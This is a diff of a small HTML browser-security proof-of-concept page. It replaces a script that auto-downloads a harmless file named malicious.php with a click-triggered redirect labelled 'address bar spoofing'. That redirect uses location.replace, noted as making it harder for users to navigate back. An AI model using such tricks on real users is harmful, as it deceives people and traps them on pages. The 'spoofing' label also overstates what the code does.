@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Delayed File Save Simulation</title>
+  <title>Address Bar Spoofing PoC</title>
   <style>
     body {
       margin: 0;
@@ -24,30 +24,18 @@
   </style>
 </head>
 <body>
-  <h1>Click anywhere to simulate file save.<br>Test on iPhone/iOS</h1>
+  <h1>Click anywhere to simulate address bar spoofing.<br>Test on Android</h1>
 
   <script>
     document.addEventListener('click', async () => {
+      // Wait for 3 seconds before "spoofing" the address bar
       setTimeout(() => {
-        const fileName = "malicious.php";
-        const content = "This is a test file content.";
-        
-        // Create a Blob to simulate the file content
-        const blob = new Blob([content], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        
-        // Create an anchor tag to trigger the file download
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = fileName;
-        
-        // Append anchor to the body and trigger the download
-        document.body.appendChild(a);
-        a.click();
-        
-        // Clean up
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
+        // Simulate the spoof by changing the URL without reloading the page
+        window.location.replace("https://example.com");
+
+        // You could also use document.location, but location.replace() is preferred
+        // because it doesn't leave history behind, making it harder for users to
+        // navigate back to the original page.
       }, 3000);
     }, { once: true });
   </script>
